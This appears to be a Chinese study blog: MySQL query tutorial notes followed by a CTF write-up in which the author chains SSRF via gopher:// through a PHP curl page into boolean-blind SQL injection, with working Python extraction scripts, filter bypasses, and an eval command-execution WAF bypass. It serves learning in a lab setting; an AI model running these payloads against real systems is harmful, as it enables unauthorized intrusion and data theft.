| MANAGER | 2450.00 || 10 | PRESIDENT | 5000.00 || 20 | ANALYST | 3000.00 || 20 | CLERK | 1100.00 || 20 | MANAGER | 2975.00 || 30 | CLERK | 950.00 || 30 | MANAGER | 2850.00 || 30 | SALESMAN | 1600.00 |+--------+-----------+----------+ 如果想对分完组之后的数据进一步过滤，不要用WHERE(参考上面的内容)，而应该用HAVING子句 1234567891011121314151617#eg：找出每个部门最高薪资，要求显示最高薪资大于3000的select deptno,max(sal) from emp group by deptno;#先不考虑要求，查最大薪资+--------+----------+| deptno | max(sal) |+--------+----------+| 10 | 5000.00 || 20 | 3000.00 || 30 | 2850.00 |+--------+----------+select deptno,max(sal) from emp group by deptno having max(sal)&gt;3000;#考虑限制要求+--------+----------+| deptno | max(sal) |+--------+----------+| 10 | 5000.00 |+--------+----------+#只有5000被留下来了#having语句要和group by配套使用，不能代替where 但是上述语句效率相对比较较低，实际上可以这样考虑： 先将薪资大于3000的用WHERE过滤了，不大于3000的就不进行分组了 123456select deptno,max(sal) from emp where sal &gt; 3000 group by deptno;+--------+----------+| deptno | max(sal) |+--------+----------+| 10 | 5000.00 |+--------+----------+ where和having优先选择where，where没办法的再选择having(比如对每个部门平均薪资进行限制的) distinct关键字： 把查询结果去除重复记录，注：原表数据不会被修改，只是查询结果去重 1234567891011121314151617181920212223242526272829select job from emp;+-----------+| job |+-----------+| CLERK || SALESMAN || SALESMAN || MANAGER || SALESMAN || MANAGER || MANAGER || ANALYST || PRESIDENT || SALESMAN || CLERK || CLERK || ANALYST || CLERK |+-----------+select distinct job from emp;#去重+-----------+| job |+-----------+| CLERK || SALESMAN || MANAGER || ANALYST || PRESIDENT |+-----------+ distinct只能出现在所有字段的最前方，如果后面有多个字段，则联合去重： 123456789101112131415161718192021222324252627282930313233select job,deptno from emp;+-----------+--------+| job | deptno |+-----------+--------+| CLERK | 20 || SALESMAN | 30 || SALESMAN | 30 || MANAGER | 20 || SALESMAN | 30 || MANAGER | 30 || MANAGER | 10 || ANALYST | 20 || PRESIDENT | 10 || SALESMAN | 30 || CLERK | 20 || CLERK | 30 || ANALYST | 20 || CLERK | 10 |+-----------+--------+select distinct job,deptno from emp;+-----------+--------+| job | deptno |+-----------+--------+| CLERK | 20 || SALESMAN | 30 || MANAGER | 20 || MANAGER | 30 || MANAGER | 10 || ANALYST | 20 || PRESIDENT | 10 || CLERK | 30 || CLERK | 10 |+-----------+--------+ 连接查询： 笛卡尔积现象： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889select ename from emp;#单独查emp表的ename字段+--------+| ename |+--------+| SMITH || ALLEN || WARD || JONES || MARTIN || BLAKE || CLARK || SCOTT || KING || TURNER || ADAMS || JAMES || FORD || MILLER |+--------+select dname from dept;#单独查dept表的dname字段+------------+| dname |+------------+| ACCOUNTING || RESEARCH || SALES || OPERATIONS |+------------+select ename,dname from emp,dept;#对两张表进行连接查询，没有任何限制的时候，查询结果条数是两个表条数的乘积+--------+------------+| ename | dname |+--------+------------+| SMITH | ACCOUNTING || SMITH | RESEARCH || SMITH | SALES || SMITH | OPERATIONS || ALLEN | ACCOUNTING || ALLEN | RESEARCH || ALLEN | SALES || ALLEN | OPERATIONS || WARD | ACCOUNTING || WARD | RESEARCH || WARD | SALES || WARD | OPERATIONS || JONES | ACCOUNTING || JONES | RESEARCH || JONES | SALES || JONES | OPERATIONS || MARTIN | ACCOUNTING || MARTIN | RESEARCH || MARTIN | SALES || MARTIN | OPERATIONS || BLAKE | ACCOUNTING || BLAKE | RESEARCH || BLAKE | SALES || BLAKE | OPERATIONS || CLARK | ACCOUNTING || CLARK | RESEARCH || CLARK | SALES || CLARK | OPERATIONS || SCOTT | ACCOUNTING || SCOTT | RESEARCH || SCOTT | SALES || SCOTT | OPERATIONS || KING | ACCOUNTING || KING | RESEARCH || KING | SALES || KING | OPERATIONS || TURNER | ACCOUNTING || TURNER | RESEARCH || TURNER | SALES || TURNER | OPERATIONS || ADAMS | ACCOUNTING || ADAMS | RESEARCH || ADAMS | SALES || ADAMS | OPERATIONS || JAMES | ACCOUNTING || JAMES | RESEARCH || JAMES | SALES || JAMES | OPERATIONS || FORD | ACCOUNTING || FORD | RESEARCH || FORD | SALES || FORD | OPERATIONS || MILLER | ACCOUNTING || MILLER | RESEARCH || MILLER | SALES || MILLER | OPERATIONS |+--------+------------+ 加限制条件： 1234567891011121314151617181920212223select emp.ename,dept.dname from emp,dept where emp.deptno = dept.deptno order by dname;#只有emp中的deptno和dept中的deptno相等时+--------+------------+| ename | dname |+--------+------------+| CLARK | ACCOUNTING || KING | ACCOUNTING || MILLER | ACCOUNTING || SCOTT | RESEARCH || FORD | RESEARCH || SMITH | RESEARCH || ADAMS | RESEARCH || JONES | RESEARCH || ALLEN | SALES || JAMES | SALES || MARTIN | SALES || TURNER | SALES || WARD | SALES || BLAKE | SALES |+--------+------------+#最终查询结果减少了，但是匹配次数没减少，还是4*14=56条#'select emp.ename,dept.dname from'部分如果换成'select ename,dname from'效率降低，因为虽然dept表中没有ename字段，但是MySQL还是会去找，emp和dname同理，而且逻辑上不够严谨select e.ename,d.dname from emp as e,dept as d where e.deptno = d.deptno order by dname;#给表起别名很重要，提高效率 内连接 等值连接 非等值连接 自连接 外连接 左外连接(左连接) 右外连接(右连接) 内连接——等值连接 上述笛卡尔积现象SQL语句是SQL92语法，SQL99语法如下： 12345678910111213141516171819202122232425262728293031select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno order by dname;+--------+------------+| ename | dname |+--------+------------+| CLARK | ACCOUNTING || KING | ACCOUNTING || MILLER | ACCOUNTING || SCOTT | RESEARCH || FORD | RESEARCH || SMITH | RESEARCH || ADAMS | RESEARCH || JONES | RESEARCH || ALLEN | SALES || JAMES | SALES || MARTIN | SALES || TURNER | SALES || WARD | SALES || BLAKE | SALES |+--------+------------+#实现了外连接与后续where语句的分离，结构更清晰#SQL99语法：SELECT ...FROM AJOIN #其实join前面省略了个inner，代表内连接，可省，但是保留可读性更好 BON A和B的连接条件 #如果是等量关系就称为等值连接WHERE 筛选条件 内连接——非等值连接： 123456789101112131415161718192021222324252627282930#eg：找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级select * from salgrade;#先看下薪资表+-------+-------+-------+| GRADE | LOSAL | HISAL |+-------+-------+-------+| 1 | 700 | 1200 || 2 | 1201 | 1400 || 3 | 1401 | 2000 || 4 | 2001 | 3000 || 5 | 3001 | 9999 |+-------+-------+-------+select e.ename,e.sal,s.grade from emp as e join salgrade as s on e.sal between s.losal and s.hisal;+--------+---------+-------+| ename | sal | grade |+--------+---------+-------+| SMITH | 800.00 | 1 || ALLEN | 1600.00 | 3 || WARD | 1250.00 | 2 || JONES | 2975.00 | 4 || MARTIN | 1250.00 | 2 || BLAKE | 2850.00 | 4 || CLARK | 2450.00 | 4 || SCOTT | 3000.00 | 4 || KING | 5000.00 | 5 || TURNER | 1500.00 | 3 || ADAMS | 1100.00 | 1 || JAMES | 950.00 | 1 || FORD | 3000.00 | 4 || MILLER | 1300.00 | 2 |+--------+---------+-------+ 内连接——自连接： 12345678910111213141516171819202122232425262728293031323334353637383940#查询员工的上级领导、要求显示员工名和对应的领导名select empno,ename,mgr from emp;+-------+--------+------+| empno | ename | mgr |+-------+--------+------+| 7369 | SMITH | 7902 || 7499 | ALLEN | 7698 || 7521 | WARD | 7698 || 7566 | JONES | 7839 || 7654 | MARTIN | 7698 || 7698 | BLAKE | 7839 || 7782 | CLARK | 7839 || 7788 | SCOTT | 7566 || 7839 | KING | NULL || 7844 | TURNER | 7698 || 7876 | ADAMS | 7788 || 7900 | JAMES | 7698 || 7902 | FORD | 7566 || 7934 | MILLER | 7782 |+-------+--------+------+select a.ename as '员工',b.ename as '领导' from emp as a join emp as b on a.mgr=b.empno;+--------+-------+| 员工 | 领导 |+--------+-------+| SMITH | FORD || ALLEN | BLAKE || WARD | BLAKE || JONES | KING || MARTIN | BLAKE || BLAKE | KING || CLARK | KING || SCOTT | JONES || TURNER | BLAKE || ADAMS | SCOTT || JAMES | BLAKE || FORD | JONES || MILLER | CLARK |+--------+-------+#自连接的技巧：一张表看做两张表，员工的领导编号等于领导的员工编号#KING没有上级 外连接： 查询员工表可以发现员工表中有10、20、30部门： 12345678910111213141516171819select * from emp;+-------+--------+-----------+------+------------+---------+---------+--------+| EMPNO | ENAME | JOB | MGR | HIREDATE | SAL | COMM | DEPTNO |+-------+--------+-----------+------+------------+---------+---------+--------+| 7369 | SMITH | CLERK | 7902 | 1980-12-17 | 800.00 | NULL | 20 || 7499 | ALLEN | SALESMAN | 7698 | 1981-02-20 | 1600.00 | 300.00 | 30 || 7521 | WARD | SALESMAN | 7698 | 1981-02-22 | 1250.00 | 500.00 | 30 || 7566 | JONES | MANAGER | 7839 | 1981-04-02 | 2975.00 | NULL | 20 || 7654 | MARTIN | SALESMAN | 7698 | 1981-09-28 | 1250.00 | 1400.00 | 30 || 7698 | BLAKE | MANAGER | 7839 | 1981-05-01 | 2850.00 | NULL | 30 || 7782 | CLARK | MANAGER | 7839 | 1981-06-09 | 2450.00 | NULL | 10 || 7788 | SCOTT | ANALYST | 7566 | 1987-04-19 | 3000.00 | NULL | 20 || 7839 | KING | PRESIDENT | NULL | 1981-11-17 | 5000.00 | NULL | 10 || 7844 | TURNER | SALESMAN | 7698 | 1981-09-08 | 1500.00 | 0.00 | 30 || 7876 | ADAMS | CLERK | 7788 | 1987-05-23 | 1100.00 | NULL | 20 || 7900 | JAMES | CLERK | 7698 | 1981-12-03 | 950.00 | NULL | 30 || 7902 | FORD | ANALYST | 7566 | 1981-12-03 | 3000.00 | NULL | 20 || 7934 | MILLER | CLERK | 7782 | 1982-01-23 | 1300.00 | NULL | 10 |+-------+--------+-----------+------+------------+---------+---------+--------+ 查询部门表发现除了10/20/30部门还有40部门： 123456789select * from dept;+--------+------------+----------+| DEPTNO | DNAME | LOC |+--------+------------+----------+| 10 | ACCOUNTING | NEW YORK || 20 | RESEARCH | DALLAS || 30 | SALES | CHICAGO || 40 | OPERATIONS | BOSTON |+--------+------------+----------+ 如果希望将除了员工表里有的部门输出外，同时输出员工表中没有的部门，就要用到外连接了： 12345678910111213141516171819202122select e.ename,d.dname from emp e right join dept d on e.deptno = d.deptno;#right表示将join关键字右边的这张表看做主表，主要是为了将这张表的数据全部查询出来，捎带着关联查询左边的表#同内连接一样，join前面有个可省可不省的outer+--------+------------+| ename | dname |+--------+------------+| SMITH | RESEARCH || ALLEN | SALES || WARD | SALES || JONES | RESEARCH || MARTIN | SALES || BLAKE | SALES || CLARK | ACCOUNTING || SCOTT | RESEARCH || KING | ACCOUNTING || TURNER | SALES || ADAMS | RESEARCH || JAMES | SALES || FORD | RESEARCH || MILLER | ACCOUNTING || NULL | OPERATIONS |+--------+------------+#除了14个员工对应的部门外，还有一个匹配不上的OPERATIONS部门也显示出来了，对应的员工为空 举一反三一下很容易得出左连接的写法： 1234567891011121314151617181920select e.ename,d.dname from dept d left join emp e on e.deptno = d.deptno;#记得把join两侧表名换位置+--------+------------+| ename | dname |+--------+------------+| SMITH | RESEARCH || ALLEN | SALES || WARD | SALES || JONES | RESEARCH || MARTIN | SALES || BLAKE | SALES || CLARK | ACCOUNTING || SCOTT | RESEARCH || KING | ACCOUNTING || TURNER | SALES || ADAMS | RESEARCH || JAMES | SALES || FORD | RESEARCH || MILLER | ACCOUNTING || NULL | OPERATIONS |+--------+------------+ 外连接查询结果条数大于等于内连接 同样是上面员工领导的问题，使用外连接，可将显示所有员工的结果： 12345678910111213141516171819select a.ename as '员工',b.ename as '领导' from emp as a left join emp as b on a.mgr = b.empno;+--------+-------+| 员工 | 领导 |+--------+-------+| SMITH | FORD || ALLEN | BLAKE || WARD | BLAKE || JONES | KING || MARTIN | BLAKE || BLAKE | KING || CLARK | KING || SCOTT | JONES || KING | NULL |#KING显示| TURNER | BLAKE || ADAMS | SCOTT || JAMES | BLAKE || FORD | JONES || MILLER | CLARK |+--------+-------+ 总结：内连接取交集，外连接取并集 多张表连接： 语法： 1234567891011121314151617SELECT ...FROM AJOIN BON f(A,B)JOIN CON g(A,C)JOIN DON h(A,B)#内连接外连接可以混合 子查询： select语句的嵌套 where中的子查询： 12345678910111213141516171819select ename,sal from emp where sal &gt; min(sal);#这句语句是错误的，shiyong max()前未分组select ename,sal from emp where sal &gt; (select min(sal) from emp);+--------+---------+| ename | sal |+--------+---------+| ALLEN | 1600.00 || WARD | 1250.00 || JONES | 2975.00 || MARTIN | 1250.00 || BLAKE | 2850.00 || CLARK | 2450.00 || SCOTT | 3000.00 || KING | 5000.00 || TURNER | 1500.00 || ADAMS | 1100.00 || JAMES | 950.00 || FORD | 3000.00 || MILLER | 1300.00 |+--------+---------+ from中的子查询： 注：from后面的子查询可以将子查询的查询结果当做一张临时表 123456789101112131415161718192021222324252627282930313233343536373839#eg:找出每个岗位的平均工资的薪资等级#第一步：找出每个岗位的平均工资（按岗位分组）select job,avg(sal) from emp group by job;+-----------+-------------+| job | avg(sal) |+-----------+-------------+| ANALYST | 3000.000000 || CLERK | 1037.500000 || MANAGER | 2758.333333 || PRESIDENT | 5000.000000 || SALESMAN | 1400.000000 |+-----------+-------------+#现在就将左表看做是一张临时表#第二步：将以上查询结果当做一张真实存在的表tselect * from salgrade;#查薪资等级+-------+-------+-------+| GRADE | LOSAL | HISAL |+-------+-------+-------+| 1 | 700 | 1200 || 2 | 1201 | 1400 || 3 | 1401 | 2000 || 4 | 2001 | 3000 || 5 | 3001 | 9999 |+-------+-------+-------+#起别名s#将t表和s表进行表连接，连接条件是t.avg(sal) between s.losal and s.hisalselect t.job,s.grade from (select job,avg(sal) from emp group by job) as t join salgrade as s on t.avg(sal) between s.losal and s.hisal;#执行以上命令出现报错：#ERROR 1630 (42000): FUNCTION t.avg does not exist. Check the 'Function Name Parsing and Resolution' section in the Reference Manual#原因是on后面的t.avg(sal)被认为是分组函数，外层select未进行分组#修改方法：起别名select t.job,s.grade from (select job,avg(sal) as avg from emp group by job) as t join salgrade as s on t.avg between s.losal and s.hisal;+-----------+-------+| job | grade |+-----------+-------+| ANALYST | 4 || CLERK | 1 || MANAGER | 4 || PRESIDENT | 5 || SALESMAN | 2 |+-----------+-------+ 联合查询(UNION)： 合并查询结果集 1234567891011121314151617181920212223242526272829select ename,job from emp where job = 'MANAGER';+-------+---------+| ename | job |+-------+---------+| JONES | MANAGER || BLAKE | MANAGER || CLARK | MANAGER |+-------+---------+select ename,job from emp where job = 'SALESMAN';+--------+----------+| ename | job |+--------+----------+| ALLEN | SALESMAN || WARD | SALESMAN || MARTIN | SALESMAN || TURNER | SALESMAN |+--------+----------+select ename,job from emp where job = 'MANAGER' union select ename,job from emp where job = 'SALESMAN';+--------+----------+| ename | job |+--------+----------+| JONES | MANAGER || BLAKE | MANAGER || CLARK | MANAGER || ALLEN | SALESMAN || WARD | SALESMAN || MARTIN | SALESMAN || TURNER | SALESMAN |+--------+----------+ 注意：union联合查询的两个结果要求列的数目以及数据类型相同 limit： WEEK2&lt;!DOCTYPE html&gt;是H5的声明位于文档的最前面，处于标签之前。他是网页必备的组成部分，避免浏览器的怪异模式。 meta标签用于描述一个HTML网页文档的属性，关键词等，eg：&lt;meta charset='UTF-8'&gt;，是单标签 生成&lt;h1&gt;到&lt;h6&gt;快捷键：h$*6 align属性，调整标题摆放位置 &lt;h1 align='left|right|center'&gt;居左，右，中，默认居左&lt;/h1&gt;&gt; 段落通过&lt;p&gt;标签定义&lt;p&gt;这是一个段落&lt;/p&gt; &lt;p&gt;这是一个可以换&lt;br&gt;行的标签&lt;/p&gt; &lt;hr/&gt;标签在html页面中创建水平线，&lt;hr color=&quot;&quot; width=&quot;&quot; size=&quot;&quot; aligh=&quot;&quot; /&gt; color：颜色 width：长度 size：水平线高度 align：对齐方式，默认居中","link":"/2023/07/09/ROIS-Summer/"},{"title":"2023ROIS冬令营","text":"2023ROIS冬令营梦开始的地方。。。。。 week1week2week3week4internal这是什么，两个超链接，点一下（ ​ SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once('config.php');if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { highlight_file(__FILE__); die('Try to access it from internal!');}echo &quot;Welcome!\\n&quot;;$id = $_POST['id'];if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;');$con = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);$sql = &quot;SELECT * FROM messages WHERE id=$id&quot;; // SQLI &gt;_&lt;$res = mysqli_query($con, $sql);$message = mysqli_fetch_array($res)['message'];echo $message;#回显Try to access it from internal! if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面： 123456789&lt;?phphighlight_file(__FILE__);// Hint: Do you know gopher?$url = $_POST['url'];if (preg_match(&quot;/file:|ftp:|http:|scp:|dict:/i&quot;,$url)) die('You bad bad &gt;_&lt;');$ch = curl_init($url);$res = curl_exec($ch);echo $res; curl_init()函数初始化一个curl绘会话，值传给$ch，curl_exec()函数执行一个curl会话，值传给$res。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：&quot;Do you know gopher?&quot;。emmm。。。并不知道。那就学呗。找到了一篇讲的比较详细的文章学习了一下。 gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。 gopher协议的格式： 1gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流 需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是%0D%0A，使用脚本或工具编码后回车换行会变成%0A，因此要多一步replace的步骤。在HTTP包的最后要加%0D%0A，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例： GET请求： 准备好一个监听机和一个用户机： nc -lp 1234监听1234端口，使用curl发送http请求curl gopher://172.17.0.1:1234/abcd，监听机收到消息为”bcd”；发送请求curl gopher://172.17.0.1:1234/aabcdnc监听到abcd。因此紧跟在&quot;&lt;PORT&gt;/&quot;字符后面的一个字符会被忽略，可换为任意一个字符。 这是一段网页源码，作用是将GET传入的name的值打印出来： 1234&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个GET请求包 123GET /ssrf.php?name=Potatowo HTTP/1.1Host: 172.17.0.1#回车 经Python脚本编写，生成对应的请求包 1234567891011import urllib.parsedata = \\&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1Host: 172.17.0.1#该行要有回车，HTTP数据包结尾&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;print(result)#output#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 POST请求： 这是一段网页源码，功能不做过多赘述： 1234&lt;?php echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个POST请求包： 1234567POST /ssrf/base/post.php HTTP/1.1host:172.17.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=Potatowo#回车 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 现在回到本题； 既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包： 1234567891011121314151617181920212223242526import urllib.parsedata = \\&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1Content-Length: 4Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid=1&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = result = urllib.parse.quote(result)#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码print(result)#output#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A 改为符合gopher协议的形式，注意由于curl_exec()的执行是在服务端里进行的，所以gopher://协议的地址应改为127.0.0.1:80，80端口是跑web服务的端口。 将脚本中的content进行修改，content = &quot;id=1 and 1=1&quot;，传入，结果： emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼 12if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;'); 看来是ban掉了union和空格。难怪，那改成content = &quot;id=1/**/and/**/1=1&quot;绕过空格过滤，回显&quot;Welcome! meow meow meow~1&quot;，改成content = &quot;id=1/**/and/**/1=2&quot;，回显&quot;Welcome! 1&quot;。sql语句判断为真会返回&quot;Welcome! meow meow meow~1&quot;，为假不含meow meow meow~，同时union被ban了，尝试用加号拼接&quot;uni&quot;,&quot;on&quot;，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。 完善脚本： 123456789101112131415161718192021222324252627282930313233import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;for i in range(0,126): content = &quot;id=1 and (length(database())={})#&quot;.format(i) content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\#切记切记下面字符串每行左边要贴边，不然tab会被编码f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result#用python直接传参只需要编码一次 r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r:#如果sql返回为真，页面会显示&quot;meow meow~&quot; print(i) break#output#3 输出3，得出数据库长度为3。 123456789101112131415161718192021222324252627282930313233343536373839import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;database = &quot;&quot;for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr(database(),{},1))={})#&quot;.format(i,j)#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot; content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r: database += chr(j) print(database) break#output#r#ru#rua#数据库名为rua 同样，爆表名，因为可能存在多个表，所以使用group_concat() 123456789101112131415161718for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{},1))={})#&quot;.format(i,j) ...........#output#f#fl#fla#flag#flag,#flag,m#flag,me#flag,mes#flag,mess#flag,messa#flag,messag#flag,message#flag,messages 盲猜flag在flag表里，爆字段名： 123456789for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'flag'),{},1))={})#&quot;.format(i,j)#爆字段名 ...........#output#f#fl#fla#flag 已知信息： 数据库rua、表flag、字段flag，爆flag内容： 123for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(flag) from flag),{},1))={})#&quot;.format(i,j)#爆flag表内容 拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import urllib.parseimport requestsdef fuck(): url = &quot;http://192.168.150.1:43083/curl.php&quot; result=&quot;&quot; for i in range(1,1290): head=32 tail=127 while head&lt;tail: mid=(head+tail)&gt;&gt;1 sqli = &quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='rua'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) id = urllib.parse.quote(sqli) id_length = len(id)+3 payload = f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {id_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid={id}&quot;&quot;&quot; # print(payload) tmp = urllib.parse.quote(payload) new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) res = 'gopher://127.0.0.1:80/_' + new dataa = { &quot;url&quot;:res } r = requests.post(url=url,data=dataa) # print(r.text) if &quot;meow meow meow&quot; in r.text: head=mid+1 else: tail=mid if head !=32: result+=chr(head) else: break print(result)fuck() 当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭 （感谢LinTu提供的思路） 浏览器发送一次请求，记住python出payload的时候要url编码两次 Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破 异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。 cachewaf一道初见被乱杀的防火墙绕过。 12345&lt;?phprequire_once('waf.php');highlight_file(__FILE__);eval($_POST['cmd']);?&gt; 简短的题目，极致的享受（× 这eval就摆在面前就别怪system直接shell了( emmm，说是右括号出了点问题，考虑到这道题有防火墙，先排查一下问题出哪了。 看起来括号本身应该不是问题，echo也没被过滤，引号也没问题，应该是system被拦截了，继续尝试。 1cmd=echo (&quot;system&quot;)(&quot;ls&quot;); 1cmd=echo `ls`; (“system”)和反引号没被过滤。 